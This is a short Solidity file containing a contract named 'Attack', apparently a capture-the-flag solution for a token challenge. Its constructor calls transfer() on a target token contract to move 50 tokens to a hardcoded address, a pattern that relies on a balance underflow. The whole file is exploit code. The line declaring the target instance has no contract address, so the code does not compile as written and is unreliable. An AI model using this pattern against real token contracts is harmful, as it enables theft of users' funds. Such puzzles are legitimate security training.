// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Instance {
    
    function transfer(address, uint) external returns (bool);
}

contract Attack {
    
    Instance instance = Instance();

    constructor() {
        
        instance.transfer(0x47cBDD4ED9A9FDCe1fB7b61240100bAD22B7Bb00, 50);
    }

}